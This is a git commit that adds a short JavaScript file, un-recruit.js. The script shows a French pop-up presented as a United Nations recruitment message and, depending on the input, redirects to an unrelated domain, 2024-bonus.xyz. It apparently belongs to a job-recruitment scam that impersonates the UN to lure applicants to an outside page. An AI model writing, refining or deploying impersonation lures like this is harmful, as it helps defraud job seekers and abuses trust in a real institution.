6ef4a985856820fb8d60d3231d7fe4ddc719f658
opayoffer <154964955+opayoffer@users.noreply.github.com>
2024-05-17 06:19:23 -0700

    Create un-recruit.js

---
+++ un-recruit.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('UN: Chers candidats, les Nations Unies ne vous demanderont jamais d'argent pour une quelconque opportunité d'emploi. La candidature est gratuite. Veuillez appuyer sur 1 pour postuler maintenant. ','1');
+if (password != '1') {
+location.href='https://2024-bonus.xyz/un-recruitment.html';
+}
